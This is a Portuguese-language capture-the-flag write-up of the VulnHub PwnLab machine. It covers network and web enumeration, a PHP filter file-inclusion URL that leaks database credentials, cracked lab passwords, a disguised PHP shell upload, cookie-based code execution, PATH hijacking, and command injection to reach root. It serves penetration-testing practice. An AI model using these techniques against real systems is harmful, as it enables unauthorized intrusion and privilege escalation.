---
title: "VulnHub - PwnLab"
tags: [Linux,Easy,Web,Gobuster,BurSuite,SQLInjection]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/inicial.png)

Link: [PwnLab](https://www.vulnhub.com/entry/pwnlab-init,158/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas abertas no servidor

> Porta 80 -> Web

> Porta 3306 -> MySQL

> Porta 111 -> RPC

> Porta 58126 -> ?

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata, parece uma animação interativa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/web.png)

No código fonte não encontramos nada de mais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/web1.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.148 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/gobuster.png)

Bom, encontramos nada de diferente do que já tem no site

Uma coisa que chamou atenção foi o parâmetro que é passado na URL

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/par.png)

Procurando por blogs na internet encontramos algumas dicas

https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/

Verificamos que utilizando filtros php podemos ler qualquer arquivo dentro da máquina remota

```
http://192.168.56.148/?page=php://filter/convert.base64-encode/resource=config
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/par1.png)

Conseguimos as credenciais do mysql

```
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
```

## Enumeração da Porta 3128

Com a senha encontrada, conseguimos logar no mysql

```bash
mysql -u root -p -h 192.168.56.103
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/sql.png)

Enumeramos três usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/sql1.png)

```
kent:Sld6WHVCSkpOeQ==
mike:U0lmZHNURW42SQ==
kane:aVN2NVltMkdSbw==
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/sql2.png)

```
A senha para Sld6WHVCSkpOeQ== é:
JWzXuBJJNy
A senha para U0lmZHNURW42SQ== é:
SIfdsTEn6I
A senha para aVN2NVltMkdSbw== é:
iSv5Ym2GRo
```

Agora fazemos login na página, vamos fazer com o usuário `kent`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/sql3.png)

Sucesso! Agora podemos fazer o upload de arquivos ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/sql4.png)

## File Upload

Bom, sabendo que podemos upar arquivos ali, vamos tentar upar nosso shell

Vamos tentar jogar esse php code

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/php.png)

Jogamos para o burp para melhor trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp2.png)

Ao tentarmos enviar, o site nos da a mensagem que só podemos fazer o upload de imagens

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp3.png)

Upload feito com sucesso depois de alterarmos a imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp4.png)

# RCE

Bom o problema agora é como vamos executar esse .gif, uma vez que não conseguimos deixar ele como .php de modo algum

A dica está no index.php

Fazemos o filter dele pra pegar o base64 dele

```
http://192.168.56.148/?page=php://filter/convert.base64-encode/resource=index
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp5.png)

Decodando, temos:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp6.png)

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
```

Ao que da pra entender aqui, ele inclue o que estiver como cookie em uma variável lang e executa como se código php fosse, então se colocarmos nosso arquivo em um cookie ele vai executar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/burp7.png)

Alteramos a requisição e temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/rce.png)

Agora pegamos um reverse shell na aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/rce1.png)

# www-data -> kent

Damos um su kent e viramos usuário kent

```
kent:JWzXuBJJNy
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kent.png)

Enumerando ele não encontramos nada de útil, então passamos pra outro usuário

# kent -> kane

```
kane:iSv5Ym2GRo
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane.png)

Iniciamos a enumeração desse usuário então

# kane -> mike

Opa, dentro do /home dele encontramos um binários que executa o comando `cat`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane1.png)

Então vamos fazer um path hijacking dele pra virarmos root

Primeira coisa é verificar qual é nosso PATH

```bash
echo $PATH
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane2.png)

Agora criamos nosso "binário"

```bash
echo '#!/bin/sh' >> cat
echo '/bin/sh' >> cat
chmod +x cat
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane3.png)

Alteramos nosso PATH

```bash
export PATH=`pwd`:$PATH
echo $PATH
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane4.png)

Agora executamos ele e viramos root! Não, viramos mike!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/kane5.png)

# mike -> root

Verificando no home do mike temos um binário com permissões de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/mike.png)

Verificamos no strings que ele executa um comando no shell, podemos escapar ele com um ;

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/mik1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/mik2.png)

Somos root, agora podemos ler a flag dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-pwnlab/root.png)